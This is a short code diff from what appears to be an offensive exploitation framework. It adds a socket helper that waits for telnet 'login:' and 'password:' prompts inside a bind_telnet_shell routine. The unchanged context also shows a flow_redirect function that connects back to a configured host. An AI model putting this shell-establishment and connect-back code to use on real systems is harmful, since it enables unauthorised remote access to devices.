@@ -75,6 +75,16 @@ def read_results(conn, inputs):
     return b'\n'
 
 
+def wait_msg(conn, inputs):
+    try:
+        while True:
+            msg = conn.recv(1024).decode('utf-8', errors='ignore')
+            if inputs in msg.lower():
+                break
+    except Exception:
+        pass
+
+
 def flow_redirect(conn):
     s = socket.socket()
     s.connect((conf.connect_back_host, conf.connect_back_port))
@@ -142,9 +152,9 @@ def bind_telnet_shell(host, port, user, pwd, check=True):
         else:
             tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             tn.connect((host, port))
-            tn.recv(1024)
+            wait_msg(tn, 'login: ')
             tn.sendall((user + "\n").encode('utf-8'))
-            tn.recv(1024)
+            wait_msg(tn,  'password: ')
             tn.sendall((pwd + "\n").encode('utf-8'))
             if check:
                 flag = random_str(6).encode()
